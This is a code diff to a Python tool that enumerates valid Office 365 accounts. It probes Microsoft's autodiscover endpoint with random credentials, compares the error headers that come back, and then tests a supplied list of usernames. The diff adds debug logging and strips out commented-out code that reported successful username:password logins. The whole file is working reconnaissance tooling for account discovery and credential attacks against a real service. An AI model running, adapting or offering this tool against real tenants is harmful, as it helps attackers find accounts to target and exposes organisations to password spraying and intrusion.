@@ -5,7 +5,8 @@ requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.
 
 class RequestAnalyzer(object):
 
-    def __init__(self):
+    def __init__(self, debugfile):
+        self.debugfile = debugfile
         self.baseline_invalid = {}
         self.baseline_valid = {}
         self.error_response = {}
@@ -100,7 +101,7 @@ class RequestAnalyzer(object):
         header_name = "HEADER-X-AutoDiscovery-Error-"
         for item in error.split("<"):
             for item1 in item.split(">"):
-                for item2 in item1.split(","): # BUG HERE
+                for item2 in item1.split(","): # POSSIBLE BUG HERE
                     if item2 != "":
                         key = header_name + item2
                         if invalid:
@@ -121,11 +122,8 @@ class RequestAnalyzer(object):
 
 
     def correlate(self):
-        # for entry in self.identical_resp:
-        #     self.keys_invalid.remove(entry)
-        #     self.keys_valid.remove(entry)
 
-        print("Generating valid/invalid response baselines")
+        log_data(self.debugfile, "Generating valid/invalid response baselines")
 
         self.keys_invalid = list(self.baseline_invalid.keys())
         self.keys_valid = list(self.baseline_valid.keys())
@@ -166,17 +164,8 @@ class RequestAnalyzer(object):
             'invalid' : self.keys_invalid
         }
 
-        print("Found {} indicators of invalid user".format(len(self.keys_invalid)))
-        print("Found {} indicators of valid user".format(len(self.keys_valid)))
-        # for key in self.keys_invalid:
-        #     print(key)
-        #     print(self.baseline_invalid[key])
-        #
-        # print("\n\n")
-        #
-        # for key in self.keys_valid:
-        #     print(key)
-        #     print(self.baseline_valid[key])
+        log_data(self.debugfile, "Found {} indicators of invalid user".format(len(self.keys_invalid)))
+        log_data(self.debugfile, "Found {} indicators of valid user".format(len(self.keys_valid)))
 
 
     def test_user_response(self,username,r):
@@ -189,7 +178,7 @@ class RequestAnalyzer(object):
                 continue
             self.current_response["HEADER-"+header] = [[r.headers[header], 1]]
         self.current_response['Body'] = [[r.text, 1]]
-        print(r.headers)
+        log_data(self.debugfile, r.headers, False)
         self.deconstruct_error(r.headers['X-AutoDiscovery-Error'], invalid=False, current=True)
 
         # print(self.current_response)
@@ -216,24 +205,34 @@ class RequestAnalyzer(object):
 
     def print_baseline(self):
 
-        # for key in self.baseline_invalid:
-            # print(key)
-            # for val in self.baseline_invalid[key]:
-            #     if val[1] != 1 and val[1] != self.request_count:
-            # print(key)
-            # print(self.baseline_invalid[key])
-
-        # for item in self.error_response:
-        #     print("{item} : {num}".format(item=item,num=self.error_response[item]))
-
-        print("\n[*] Factors indicating invalid hits:")
+        log_data(self.debugfile, "\n[*] Factors indicating invalid hits:")
         for key in self.baseline['invalid']:
-            print("\t{} : {}".format(key, self.baseline_invalid[key][0][0]))
+            if "X-AutoDiscovery-Error" in key:
+                printstr = "HEADER-X-AutoDiscovery-Error"
+            else:
+                printstr = key
+            log_data(self.debugfile, "\t{} : {}".format(printstr, self.baseline_invalid[key][0][0]))
 
 
-        print("\n[*] Factors indicating valid hits:")
+        log_data(self.debugfile, "\n[*] Factors indicating valid hits:")
         for key in self.baseline['valid']:
-            print("\t{} : {}".format(key, self.baseline_valid[key][0][0]))
+            if "X-AutoDiscovery-Error" in key:
+                printstr = "HEADER-X-AutoDiscovery-Error"
+            else:
+                printstr = key
+            log_data(self.debugfile, "\t{} : {}".format(printstr, self.baseline_valid[key][0][0]))
+
+
+def log_data(debugfile, data, do_print=True):
+
+    if debugfile is not None:
+        f = open(debugfile, 'a')
+        f.write(str(data))
+        f.write('\n')
+        f.close()
+
+    if do_print:
+        print(data)
 
 
 def main(args):
@@ -241,6 +240,7 @@ def main(args):
     testfile = args.testfile
     domain = args.domain
     valid = args.valid
+    debugfile = args.debug
 
     password = "".join(random.choice("0123456789abcdefghijklmnopqrstuvwxyz") for _ in range(32)) # args.password
 
@@ -252,11 +252,13 @@ def main(args):
         uname = "".join(random.choice("0123456789abcdefghijklmnopqrstuvwxyz") for _ in range(20))
         users.append(uname + "@{}".format(domain.strip()))
 
-    analyzer = RequestAnalyzer()
+    analyzer = RequestAnalyzer(debugfile)
+
 
     for user in users:
 
-        print("Requesting: {}".format(user))
+        log_data(debugfile, "Requesting: {}".format(user))
+
         r = requests.get("https://autodiscover-s.outlook.com/autodiscover/autodiscover.xml", auth=(user.strip(), password), verify=False)
         # print('\n\n')
         # print(r.headers)
@@ -269,17 +271,17 @@ def main(args):
     if domain.strip() not in valid.strip():
         valid = valid + "@{}".format(domain.strip())
 
-    print("Requesting Valid: {}".format(valid.strip()))
+    log_data(debugfile, "Requesting Valid: {}".format(valid.strip()))
     user = valid.strip()
     r = requests.get("https://autodiscover-s.outlook.com/autodiscover/autodiscover.xml", auth=(user.strip(), password), verify=False)
     analyzer.add_request_known_valid(r)
-    print("Finished")
+    log_data(debugfile, "Finished")
 
     analyzer.correlate()
     if args.verbose:
         analyzer.print_baseline()
 
-    print("\n\nTesting users")
+    log_data(debugfile, "\n\nTesting users")
 
     users = open(testfile,'r').readlines()
     for user in users:
@@ -288,63 +290,7 @@ def main(args):
             user = user + "@{}".format(domain.strip())
         r = requests.get("https://autodiscover-s.outlook.com/autodiscover/autodiscover.xml", auth=(user.strip(), password), verify=False)
 
-        print(analyzer.test_user_response(user.strip(),r))
-        # print('\n\n')
-
-        #
-        # f = open(logfile, "a")
-        # f.write(str(r.headers) + '\n')
-        # f.write(r.text + '\n')
-        # f.write(str(r.status_code) + '\n')
-        # try:
-        #     loc = r.headers['X-AutoDiscovery-Error'].index("BlockStatus")
-        #     end = r.headers['X-AutoDiscovery-Error'].find(">",loc)
-        #     stri = r.headers['X-AutoDiscovery-Error'][loc:end]
-        #     f.write(stri)
-        # except:
-        #     pass
-        # f.write('\n\n')
-        #
-        #
-        # if r.status_code == 200:
-        #     print(f"[!] SUCCESS! {user.strip()}:{password}")
-        #     f.write(f"[!] SUCCESS! {user.strip()}:{password}\n")
-        #
-        # elif r.status_code == 456:
-        #     print(f"[!] SUCCESS! {user.strip()}:{password} - however cannot log in: please check manually (2FA, account locked...)")
-        #     f.write(f"[!] SUCCESS! {user.strip()}:{password} - however cannot log in: please check manually (2FA, account locked...)\n")
-        #
-        # else:
-        #
-        #     error = r.headers["X-AutoDiscovery-Error"]
-        #
-        #     if "UserType:Federated" in error:
-        #
-        #         userenum = ""
-        #         status = ""
-        #         if "BlockStatus:8" in error:
-        #             userenum = "Valid User B8"
-        #             status = "[+]"
-        #         elif "<STSUrl" in error or "<AS:BasicAuthBlockedForUserNotFound>" in error or "<AS:FederatedStsFailed>" in error:
-        #             userenum = "Invalid User"
-        #             status = "[-]"
-        #         elif "The security token could not be authenticated or authorized" in error:
-        #             userenum = "Valid User (Trigger)"
-        #             status = "[+]"
-        #         else:
-        #             userenum = "Valid User"
-        #             status = "[+]"
-        #
-        #
-        #         print(f"{status} FAILED. {user.strip()}:{password} {userenum} {stri}")
-        #         f.write(f"{status} FAILED. {user.strip()}:{password} {userenum}\n")
-        #
-        #     else:
-        #         print(f"{r.status_code} Unknown error")
-        #
-        #     f.close()
-
-
+        log_data(debugfile, analyzer.test_user_response(user.strip(),r))
 
 
 if __name__ == '__main__':
@@ -354,6 +300,7 @@ if __name__ == '__main__':
     parser.add_argument('-d', '--domain', default=None, required=True, help='Office365 Tenant Domain')
     parser.add_argument('-v', '--valid', default=None, required=True, help='Known valid email address, like a point of contact email')
     parser.add_argument('--verbose', default=False, action="store_true", help='Display raw baseline data')
+    parser.add_argument('--debug', default=None, required=False, help='Output full response & data to debug file')
     #
     args = parser.parse_args()
     # args = None
